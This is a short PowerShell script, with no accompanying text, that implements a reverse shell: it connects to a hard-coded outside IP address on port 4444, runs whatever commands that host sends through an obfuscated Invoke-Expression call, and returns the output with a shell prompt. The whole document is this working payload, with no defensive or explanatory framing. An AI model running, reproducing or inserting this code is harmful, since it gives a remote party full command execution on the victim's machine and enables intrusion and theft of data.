$h='System.Net.Sockets.TCPClient';$a='System.Text.ASCIIEncoding';
$i = "134.209.113.62";$p = 4444
$c=New-Object ($h) ($i,$p);$s=$c.GetStream()
$b=0..65535|%{0}
while(($r=$s.Read($b,0,$b.Length)) -ne 0){
$d=(New-Object ($a)).GetString($b,0,$r)
$t=&('ie'+'x') $d 2>&1 | Out-String
$t2=$t + ('PS ' + (pwd).Path + '> ')
$m=[Text.Encoding]::ASCII.GetBytes($t2)
$s.Write($m,0,$m.Length);$s.Flush()
};$c.Close()
